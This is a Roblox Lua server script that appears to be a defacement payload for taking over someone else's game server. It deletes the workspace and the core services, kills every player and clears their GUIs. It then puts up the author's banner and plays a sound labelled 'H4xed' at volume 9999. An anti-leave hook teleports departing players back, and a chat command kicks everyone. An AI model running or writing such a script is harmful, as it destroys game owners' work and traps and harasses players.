local function safe(fn) pcall(fn) end
local P = game:GetService("Players")

-- 1. Clear workspace
safe(function()
	for _, obj in workspace:GetChildren() do
		if not obj:IsA("Terrain") and not P:GetPlayerFromCharacter(obj) then
			obj:Destroy()
		end
	end
end)

-- 2. Clear players
safe(function()
	for _, plr in P:GetPlayers() do
		safe(function() plr.PlayerGui:ClearAllChildren() end)
		safe(function() plr.Backpack:ClearAllChildren() end)
		safe(function()
			if plr.Character then
				local h = plr.Character:FindFirstChildOfClass("Humanoid")
				if h then h.Health = 0 end
			end
		end)
	end
end)

-- 3. Clear services
safe(function() game:GetService("StarterGui"):ClearAllChildren() end)
safe(function() game:GetService("StarterPack"):ClearAllChildren() end)
safe(function() game:GetService("ReplicatedStorage"):ClearAllChildren() end)
safe(function() game:GetService("ServerScriptService"):ClearAllChildren() end)
safe(function() game:GetService("ServerStorage"):ClearAllChildren() end)

-- 4. Baseplate baru
safe(function()
	local bp = Instance.new("Part")
	bp.Name = "Baseplate"
	bp.Size = Vector3.new(512, 20, 512)
	bp.Position = Vector3.new(0, -10, 0)
	bp.Anchored = true
	bp.BrickColor = BrickColor.new("Medium green")
	bp.Material = Enum.Material.Grass
	bp.Parent = workspace
end)

safe(function()
	local sp = Instance.new("SpawnLocation")
	sp.Size = Vector3.new(6, 1, 6)
	sp.Position = Vector3.new(0, 1, 0)
	sp.Anchored = true
	sp.BrickColor = BrickColor.new("Bright blue")
	sp.Parent = workspace
end)

-- 5. Hint
local hint
safe(function()
	hint = Instance.new("Hint")
	hint.Text = "WELCOME TO BASIC BASEPLATE | BY KHAFIDZKTP"
	hint.Parent = workspace
end)

-- 6. Helper functions
local function setPart(char, name, pos, rotY, size)
	local part = char:FindFirstChild(name)
	if not part then return end
	part.Size = size
	part.CFrame = CFrame.new(pos) * CFrame.Angles(0, math.rad(rotY), 0)
	part.Anchored = true
end

local function breakJoints(char)
	-- Hanya hapus Motor6D, biar aksesori tetap terpasang
	for _, v in char:GetDescendants() do
		if v:IsA("Motor6D") then
			v:Destroy()
		end
	end
	for _, v in char:GetDescendants() do
		if v:IsA("BasePart") then
			v.Anchored = true
		end
	end
end

-- 7. NPC MY BROTHER (zeros7299)
safe(function()
	local id = P:GetUserIdFromNameAsync("zeros7299")
	local desc = P:GetHumanoidDescriptionFromUserId(id)
	local char = P:CreateHumanoidModelFromDescriptionAsync(desc, Enum.HumanoidRigType.R6)
	char.Name = "My Brother"
	char.Parent = workspace

	breakJoints(char)

	local r = 35
	setPart(char, "Torso",     Vector3.new(18.501, 10.333, 22.988), r, Vector3.new(7.555, 7.555, 3.777))
	setPart(char, "Head",      Vector3.new(18.501, 16,     22.988), r, Vector3.new(7.555, 3.777, 3.777))
	setPart(char, "Left Arm",  Vector3.new(13.859, 10.333, 26.239), r, Vector3.new(3.777, 7.555, 3.777))
	setPart(char, "Right Arm", Vector3.new(23.143, 10.333, 19.738), r, Vector3.new(3.777, 7.555, 3.777))
	setPart(char, "Left Leg",  Vector3.new(23.142, 10.333, 19.738), r, Vector3.new(3.776, 7.554, 3.776))
	setPart(char, "Right Leg", Vector3.new(20.049, 2.777,  21.905), r, Vector3.new(3.777, 7.555, 3.777))

	local hrp = char:FindFirstChild("HumanoidRootPart")
	if hrp then
		hrp.CFrame = CFrame.new(18.501, 10.333, 22.988)
		hrp.Anchored = true
	end
end)

-- 8. NPC YTZ_DEXZ (KHAFIDZKTP)
safe(function()
	local id = P:GetUserIdFromNameAsync("KHAFIDZKTP")
	local desc = P:GetHumanoidDescriptionFromUserId(id)
	local char = P:CreateHumanoidModelFromDescriptionAsync(desc, Enum.HumanoidRigType.R6)
	char.Name = "YTZ_DEXZ"
	char.Parent = workspace

	breakJoints(char)

	local r = -35
	setPart(char, "Head",      Vector3.new(-24.263, 16,     21.192), r, Vector3.new(7.555, 3.777, 3.777))
	setPart(char, "Torso",     Vector3.new(-24.263, 10.333, 21.192), r, Vector3.new(7.554, 7.554, 3.776))
	setPart(char, "Left Arm",  Vector3.new(-28.905, 10.333, 17.942), r, Vector3.new(3.777, 7.555, 3.777))
	setPart(char, "Right Arm", Vector3.new(-19.621, 10.333, 24.442), r, Vector3.new(3.777, 7.555, 3.777))
	setPart(char, "Left Leg",  Vector3.new(-25.81,  2.777,  20.109), r, Vector3.new(3.777, 7.555, 3.777))
	setPart(char, "Right Leg", Vector3.new(-22.716, 2.777,  22.275), r, Vector3.new(3.777, 7.555, 3.777))

	local hrp = char:FindFirstChild("HumanoidRootPart")
	if hrp then
		hrp.CFrame = CFrame.new(-24.263, 10.333, 21.192)
		hrp.Anchored = true
	end
end)

-- 9. Lighting reset
safe(function()
	local L = game:GetService("Lighting")
	L:ClearAllChildren()
	L.Ambient = Color3.fromRGB(70, 70, 70)
	L.Brightness = 2
	L.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
	L.ColorShift_Top = Color3.fromRGB(0, 0, 0)
	L.EnvironmentDiffuseScale = 1
	L.EnvironmentSpecularScale = 1
	L.GlobalShadows = true
	L.OutdoorAmbient = Color3.fromRGB(70, 70, 70)
	L.ShadowSoftness = 0.2
	L.Technology = Enum.Technology.Future
	L.ClockTime = 14

	local sky = Instance.new("Sky")
	sky.Parent = L
end)

-- 10. Sound global
safe(function()
	local sound = Instance.new("Sound")
	sound.Name = "H4xed By not4player214"
	sound.SoundId = "rbxassetid://1839246711"
	sound.Volume = 9999
	sound.PlaybackSpeed = 0.9
	sound.RollOffMaxDistance = 999999
	sound.RollOffMode = Enum.RollOffMode.InverseTapered
	sound.Parent = workspace
	sound:Play()
end)

-- 11. Anti-leave + Shutdown
local shutdownMode = false
local TS = game:GetService("TeleportService")
local placeId = game.PlaceId

local function setupChat(plr)
	plr.Chatted:Connect(function(msg)
		if msg:lower() == "/shutdown" then
			shutdownMode = true
			if hint then hint.Text = "SERVER SHUTDOWN BY KHAFIDZKTP" end
			for _, p in P:GetPlayers() do
				safe(function() p:Kick("Server di-shutdown oleh KHAFIDZKTP") end)
			end
		end
	end)
end

P.PlayerRemoving:Connect(function(plr)
	if shutdownMode then return end
	task.wait(0.5)
	safe(function()
		TS:TeleportAsync(placeId, {plr})
	end)
end)

P.PlayerAdded:Connect(function(plr)
	if shutdownMode then
		plr:Kick("Server telah di-shutdown oleh KHAFIDZKTP")
		return
	end
	setupChat(plr)
end)

for _, plr in P:GetPlayers() do
	setupChat(plr)
end
